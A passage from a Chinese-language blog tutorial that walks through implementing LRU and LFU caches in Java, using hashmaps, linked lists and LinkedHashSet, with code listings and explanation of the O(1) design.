&#125;</span><br></pre></td></tr></table></figure><p>先不慌去实现 LRU 算法的 <code>get</code> 和 <code>put</code> 方法。由于我们要同时维护一个双链表 <code>cache</code> 和一个哈希表 <code>map</code>，很容易漏掉一些操作，比如说删除某个 <code>key</code> 时，在 <code>cache</code> 中删除了对应的 <code>Node</code>，但是却忘记在 <code>map</code> 中删除 <code>key</code>。</p><p><strong>解决这种问题的有效方法是：在这两种数据结构之上提供一层抽象 API</strong>。</p><p>说的有点玄幻，实际上很简单，就是尽量让 LRU 的主方法 <code>get</code> 和 <code>put</code> 避免直接操作 <code>map</code> 和 <code>cache</code> 的细节。我们可以先实现下面几个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 将某个 key 提升为最近使用的 */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">makeRecently</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    Node x = map.get(key);</span><br><span class="line">    <span class="comment">// 先从链表中删除这个节点</span></span><br><span class="line">    cache.remove(x);</span><br><span class="line">    <span class="comment">// 重新插到队尾</span></span><br><span class="line">    cache.addLast(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 添加最近使用的元素 */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addRecently</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    Node x = <span class="keyword">new</span> Node(key, val);</span><br><span class="line">    <span class="comment">// 链表尾部就是最近使用的元素</span></span><br><span class="line">    cache.addLast(x);</span><br><span class="line">    <span class="comment">// 别忘了在 map 中添加 key 的映射</span></span><br><span class="line">    map.put(key, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 删除某一个 key */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">deleteKey</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    Node x = map.get(key);</span><br><span class="line">    <span class="comment">// 从链表中删除</span></span><br><span class="line">    cache.remove(x);</span><br><span class="line">    <span class="comment">// 从 map 中删除</span></span><br><span class="line">    map.remove(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 删除最久未使用的元素 */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeLeastRecently</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 链表头部的第一个元素就是最久未使用的</span></span><br><span class="line">    Node deletedNode = cache.removeFirst();</span><br><span class="line">    <span class="comment">// 同时别忘了从 map 中删除它的 key</span></span><br><span class="line">    <span class="keyword">int</span> deletedKey = deletedNode.key;</span><br><span class="line">    map.remove(deletedKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就能回答之前的问答题「为什么要在链表中同时存储 key 和 val，而不是只存储 val」，注意 <code>removeLeastRecently</code> 函数中，我们需要用 <code>deletedNode</code> 得到 <code>deletedKey</code>。</p><p>也就是说，当缓存容量已满，我们不仅仅要删除最后一个 <code>Node</code> 节点，还要把 <code>map</code> 中映射到该节点的 <code>key</code> 同时删除，而这个 <code>key</code> 只能由 <code>Node</code> 得到。如果 <code>Node</code> 结构中只存储 <code>val</code>，那么我们就无法得知 <code>key</code> 是什么，就无法删除 <code>map</code> 中的键，造成错误。</p><p>上述方法就是简单的操作封装，调用这些函数可以避免直接操作 <code>cache</code> 链表和 <code>map</code> 哈希表，下面我先来实现 LRU 算法的 <code>get</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!map.containsKey(key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将该数据提升为最近使用的</span></span><br><span class="line">    makeRecently(key);</span><br><span class="line">    <span class="keyword">return</span> map.get(key).val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>put</code> 方法稍微复杂一些，我们先来画个图搞清楚它的逻辑：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/LRU_put.jpg" alt="LRU_put" style="zoom:50%;" /></p><p>这样我们可以轻松写出 <code>put</code> 方法的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key)) &#123;</span><br><span class="line">        <span class="comment">// 删除旧的数据</span></span><br><span class="line">        deleteKey(key);</span><br><span class="line">        <span class="comment">// 新插入的数据为最近使用的数据</span></span><br><span class="line">        addRecently(key, val);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cap == cache.size()) &#123;</span><br><span class="line">        <span class="comment">// 删除最久未使用的元素</span></span><br><span class="line">        removeLeastRecently();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加为最近使用的元素</span></span><br><span class="line">    addRecently(key, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，你应该已经完全掌握 LRU 算法的原理和实现了，我们最后用 Java 的内置类型 <code>LinkedHashMap</code> 来实现 LRU 算法，逻辑和之前完全一致，我就不过多解释了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cap;</span><br><span class="line">    LinkedHashMap&lt;Integer, Integer&gt; cache = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">this</span>.cap = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache.containsKey(key)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将 key 变为最近使用</span></span><br><span class="line">        makeRecently(key);</span><br><span class="line">        <span class="keyword">return</span> cache.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cache.containsKey(key)) &#123;</span><br><span class="line">            <span class="comment">// 修改 key 的值</span></span><br><span class="line">            cache.put(key, val);</span><br><span class="line">            <span class="comment">// 将 key 变为最近使用</span></span><br><span class="line">            makeRecently(key);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cache.size() &gt;= <span class="keyword">this</span>.cap) &#123;</span><br><span class="line">            <span class="comment">// 链表头部就是最久未使用的 key</span></span><br><span class="line">            <span class="keyword">int</span> oldestKey = cache.keySet().iterator().next();</span><br><span class="line">            cache.remove(oldestKey);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将新的 key 添加链表尾部</span></span><br><span class="line">        cache.put(key, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">makeRecently</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> val = cache.get(key);</span><br><span class="line">        <span class="comment">// 删除 key，重新插入到队尾</span></span><br><span class="line">        cache.remove(key);</span><br><span class="line">        cache.put(key, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-LFU算法"><a href="#3-LFU算法" class="headerlink" title="3. LFU算法"></a>3. LFU算法</h1><p>从实现难度上来说，LFU 算法的难度大于 LRU 算法，因为 LRU 算法相当于把数据按照时间排序，这个需求借助链表很自然就能实现，你一直从链表头部加入元素的话，越靠近头部的元素就是新的数据，越靠近尾部的元素就是旧的数据，我们进行缓存淘汰的时候只要简单地将尾部的元素淘汰掉就行了。</p><p>而 LFU 算法相当于是淘汰访问频次最低的数据，如果访问频次最低的数据有多条，需要淘汰最旧的数据。把数据按照访问频次进行排序，而且频次还会不断变化，这可不容易实现。</p><p><strong>话说回来，这种著名的算法的套路都是固定的，关键是由于逻辑较复杂，不容易写出漂亮且没有 bug 的代码</strong>。</p><h2 id="3-1-算法描述"><a href="#3-1-算法描述" class="headerlink" title="3.1 算法描述"></a>3.1 算法描述</h2><p>要求你写一个类，接受一个<code>capacity</code>参数，实现<code>get</code>和<code>put</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LFUCache</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 构造容量为 capacity 的缓存</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LFUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="comment">// 在缓存中查询 key</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="comment">// 将 key 和 val 存入缓存</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> val)</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>get(key)</code>方法会去缓存中查询键<code>key</code>，如果<code>key</code>存在，则返回<code>key</code>对应的<code>val</code>，否则返回 -1。</p><p><code>put(key, value)</code>方法插入或修改缓存。如果<code>key</code>已存在，则将它对应的值改为<code>val</code>；如果<code>key</code>不存在，则插入键值对<code>(key, val)</code>。</p><p>当缓存达到容量<code>capacity</code>时，则应该在插入新的键值对之前，删除使用频次（后文用<code>freq</code>表示）最低的键值对。如果<code>freq</code>最低的键值对有多个，则删除其中最旧的那个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造一个容量为 2 的 LFU 缓存</span></span><br><span class="line">LFUCache cache = <span class="keyword">new</span> LFUCache(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入两对 (key, val)，对应的 freq 为 1</span></span><br><span class="line">cache.put(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">cache.put(<span class="number">2</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询 key 为 1 对应的 val</span></span><br><span class="line"><span class="comment">// 返回 10，同时键 1 对应的 freq 变为 2</span></span><br><span class="line">cache.get(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 容量已满，淘汰 freq 最小的键 2</span></span><br><span class="line"><span class="comment">// 插入键值对 (3, 30)，对应的 freq 为 1</span></span><br><span class="line">cache.put(<span class="number">3</span>, <span class="number">30</span>);   </span><br><span class="line"></span><br><span class="line"><span class="comment">// 键 2 已经被淘汰删除，返回 -1</span></span><br><span class="line">cache.get(<span class="number">2</span>); </span><br></pre></td></tr></table></figure><h2 id="3-2-思路分析"><a href="#3-2-思路分析" class="headerlink" title="3.2 思路分析"></a>3.2 思路分析</h2><p>一定先从最简单的开始，根据 LFU 算法的逻辑，我们先列举出算法执行过程中的几个显而易见的事实：</p><p>1、调用<code>get(key)</code>方法时，要返回该<code>key</code>对应的<code>val</code>。</p><p>2、只要用<code>get</code>或者<code>put</code>方法访问一次某个<code>key</code>，该<code>key</code>的<code>freq</code>就要加一。</p><p>3、如果在容量满了的时候进行插入，则需要将<code>freq</code>最小的<code>key</code>删除，如果最小的<code>freq</code>对应多个<code>key</code>，则删除其中最旧的那一个。</p><p>好的，我们希望能够在 O(1) 的时间内解决这些需求，可以使用基本数据结构来逐个击破：</p><p><strong>1、</strong>使用一个<code>HashMap</code>存储<code>key</code>到<code>val</code>的映射，就可以快速计算<code>get(key)</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Integer, Integer&gt; keyToVal;</span><br></pre></td></tr></table></figure><p><strong>2、</strong>使用一个<code>HashMap</code>存储<code>key</code>到<code>freq</code>的映射，就可以快速操作<code>key</code>对应的<code>freq</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Integer, Integer&gt; keyToFreq;</span><br></pre></td></tr></table></figure><p><strong>3、</strong>这个需求应该是 LFU 算法的核心，所以我们分开说。</p><p><strong>3.1</strong>、首先，肯定是需要<code>freq</code>到<code>key</code>的映射，用来找到<code>freq</code>最小的<code>key</code>。</p><p><strong>3.2、</strong>将<code>freq</code>最小的<code>key</code>删除，那你就得快速得到当前所有<code>key</code>最小的<code>freq</code>是多少。想要时间复杂度 O(1) 的话，肯定不能遍历一遍去找，那就用一个变量<code>minFreq</code>来记录当前最小的<code>freq</code>吧。</p><p><strong>3.3、</strong>可能有多个<code>key</code>拥有相同的<code>freq</code>，所以 <strong><code>freq</code>对<code>key</code>是一对多的关系</strong>，即一个<code>freq</code>对应一个<code>key</code>的列表。</p><p><strong>3.4、</strong>希望<code>freq</code>对应的<code>key</code>的列表是<strong>存在时序</strong>的，便于快速查找并删除最旧的<code>key</code>。</p><p><strong>3.5、</strong>希望<strong>能够快速删除<code>key</code>列表中的任何一个<code>key</code></strong>，因为如果频次为<code>freq</code>的某个<code>key</code>被访问，那么它的频次就会变成<code>freq+1</code>，就应该从<code>freq</code>对应的<code>key</code>列表中删除，加到<code>freq+1</code>对应的<code>key</code>的列表中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Integer, LinkedHashSet&lt;Integer&gt;&gt; freqToKeys;</span><br><span class="line"><span class="keyword">int</span> minFreq = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>介绍一下这个<code>LinkedHashSet</code>，它满足我们 3.3，3.4，3.5 这几个要求。你会发现普通的链表<code>LinkedList</code>能够满足 3.3，3.4 这两个要求，但是由于普通链表不能快速访问链表中的某一个节点，所以无法满足 3.5 的要求。</p><p><code>LinkedHashSet</code>顾名思义，是链表和哈希集合的结合体。链表不能快速访问链表节点，但是插入元素具有时序；哈希集合中的元素无序，但是可以对元素进行快速的访问和删除。</p><p>那么，它俩结合起来就兼具了哈希集合和链表的特性，既可以在 O(1) 时间内访问或删除其中的元素，又可以保持插入的时序，高效实现 3.5 这个需求。</p><p>综上，我们可以写出 LFU 算法的基本数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LFUCache</span> </span>&#123;</span><br><span class="line">    <span class="comment">// key 到 val 的映射，我们后文称为 KV 表</span></span><br><span class="line">    HashMap&lt;Integer, Integer&gt; keyToVal;</span><br><span class="line">    <span class="comment">// key 到 freq 的映射，我们后文称为 KF 表</span></span><br><span class="line">    HashMap&lt;Integer, Integer&gt; keyToFreq;</span><br><span class="line">    <span class="comment">// freq 到 key 列表的映射，我们后文称为 FK 表</span></span><br><span class="line">    HashMap&lt;Integer, LinkedHashSet&lt;Integer&gt;&gt; freqToKeys;</span><br><span class="line">    <span class="comment">// 记录最小的频次</span></span><br><span class="line">    <span class="keyword">int</span> minFreq;</span><br><span class="line">    <span class="comment">// 记录 LFU 缓存的最大容量</span></span><br><span class="line">    <span class="keyword">int</span> cap;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LFUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        keyToVal = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        keyToFreq = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        freqToKeys = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">this</span>.cap = capacity;</span><br><span class="line">        <span class="keyword">this</span>.minFreq = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> val)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-3-代码框架"><a href="#3-3-代码框架" class="headerlink" title="3.3 代码框架"></a>3.3 代码框架</h2><p>LFU 的逻辑不难理解，但是写代码实现并不容易，因为你看我们要维护<code>KV</code>表，<code>KF</code>表，<code>FK</code>表三个映射，特别容易出错。对于这种情况，labuladong 教你三个技巧：</p><p><strong>1、</strong>不要企图上来就实现算法的所有细节，而应该自顶向下，逐步求精，先写清楚主函数的逻辑框架，然后再一步步实现细节。</p><p><strong>2、</strong>搞清楚映射关系，如果我们更新了某个<code>key</code>对应的<code>freq</code>，那么就要同步修改<code>KF</code>表和<code>FK</code>表，这样才不会出问题。</p><p><strong>3、</strong>画图，画图，画图，重要的话说三遍，把逻辑比较复杂的部分用流程图画出来，然后根据图来写代码，可以极大减少出错的概率。</p><p>下面我们先来实现<code>get(key)</code>方法，逻辑很简单，返回<code>key</code>对应的<code>val</code>，然后增加<code>key</code>对应的<code>freq</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!keyToVal.containsKey(key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 增加 key 对应的 freq</span></span><br><span class="line">    increaseFreq(key);</span><br><span class="line">    <span class="keyword">return</span> keyToVal.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加<code>key</code>对应的<code>freq</code>是 LFU 算法的核心，所以我们干脆直接抽象成一个函数<code>increaseFreq</code>，这样<code>get</code>方法看起来就简洁清晰了对吧。</p><p>下面来实现<code>put(key, val)</code>方法，逻辑略微复杂，我们直接画个图来看：</p><p>这图就是随手画的，不是什么正规的程序流程图，但是算法逻辑一目了然，看图可以直接写出<code>put</code>方法的逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.cap &lt;= <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 若 key 已存在，修改对应的 val 即可 */</span></span><br><span class="line">    <span class="keyword">if</span> (keyToVal.containsKey(key)) &#123;</span><br><span class="line">        keyToVal.put(key, val);</span><br><span class="line">        <span class="comment">// key 对应的 freq 加一</span></span><br><span class="line">        increaseFreq(key);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* key 不存在，需要插入 */</span></span><br><span class="line">    <span class="comment">/* 容量已满的话需要淘汰一个 freq 最小的 key */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.cap &lt;= keyToVal.size()) &#123;</span><br><span class="line">        removeMinFreqKey();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 插入 key 和 val，对应的 freq 为 1 */</span></span><br><span class="line">    <span class="comment">// 插入 KV 表</span></span><br><span class="line">    keyToVal.put(key, val);</span><br><span class="line">    <span class="comment">// 插入 KF 表</span></span><br><span class="line">    keyToFreq.put(key, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 插入 FK 表</span></span><br><span class="line">    freqToKeys.putIfAbsent(<span class="number">1</span>, <span class="keyword">new</span> LinkedHashSet&lt;&gt;());</span><br><span class="line">    freqToKeys.get(<span class="number">1</span>).add(key);</span><br><span class="line">    <span class="comment">// 插入新 key 后最小的 freq 肯定是 1</span></span><br><span class="line">    <span class="keyword">this</span>.minFreq = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>increaseFreq</code>和<code>removeMinFreqKey</code>方法是 LFU 算法的核心，我们下面来看看怎么借助<code>KV</code>表，<code>KF</code>表，<code>FK</code>表这三个映射巧妙完成这两个函数。</p><h2 id="3-4-LFU-核心逻辑"><a href="#3-4-LFU-核心逻辑" class="headerlink" title="3.4 LFU 核心逻辑"></a>3.4 LFU 核心逻辑</h2><p>首先来实现<code>removeMinFreqKey</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeMinFreqKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// freq 最小的 key 列表</span></span><br><span class="line">    LinkedHashSet&lt;Integer&gt; keyList = freqToKeys.get(<span class="keyword">this</span>.minFreq);</span><br><span class="line">    <span class="comment">// 其中最先被插入的那个 key 就是该被淘汰的 key</span></span><br><span class="line">    <span class="keyword">int</span> deletedKey = keyList.iterator().next();</span><br><span class="line">    <span class="comment">/* 更新 FK 表 */</span></span><br><span class="line">    keyList.remove(deletedKey);</span><br><span class="line">    <span class="keyword">if</span> (keyList.isEmpty()) &#123;</span><br><span class="line">        freqToKeys.remove(<span class="keyword">this</span>.minFreq);</span><br><span class="line">        <span class="comment">// 问：这里需要更新 minFreq 的值吗？</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 更新 KV 表 */</span></span><br><span class="line">    keyToVal.remove(deletedKey);</span><br><span class="line">    <span class="comment">/* 更新 KF 表 */</span></span><br><span class="line">    keyToFreq.remove(deletedKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除某个键<code>key</code>肯定是要同时修改三个映射表的，借助<code>minFreq</code>参数可以从<code>FK</code>表中找到<code>freq</code>最小的<code>keyList</code>，根据时序，其中第一个元素就是要被淘汰的<code>deletedKey</code>，操作三个映射表删除这个<code>key</code>即可。</p><p>但是有个细节问题，如果<code>keyList</code>中只有一个元素，那么删除之后<code>minFreq</code>对应的<code>key</code>列表就为空了，也就是<code>minFreq</code>变量需要被更新。如何计算当前的<code>minFreq</code>是多少呢？</p><p>实际上没办法快速计算<code>minFreq</code>，只能线性遍历<code>FK</code>表或者<code>KF</code>表来计算，这样肯定不能保证 O(1) 的时间复杂度。</p><p><strong>但是，其实这里没必要更新<code>minFreq</code>变量</strong>，因为你想想<code>removeMinFreqKey</code>这个函数是在什么时候调用？在<code>put</code>方法中插入新<code>key</code>时可能调用。而你回头看<code>put</code>的代码，插入新<code>key</code>时一定会把<code>minFreq</code>更新成 1，所以说即便这里<code>minFreq</code>变了，我们也不需要管它。</p><p>下面来实现<code>increaseFreq</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">increaseFreq</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> freq = keyToFreq.get(key);</span><br><span class="line">    <span class="comment">/* 更新 KF 表 */</span></span><br><span class="line">    keyToFreq.put(key, freq + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* 更新 FK 表 */</span></span><br><span class="line">    <span class="comment">// 将 key 从 freq 对应的列表中删除</span></span><br><span class="line">    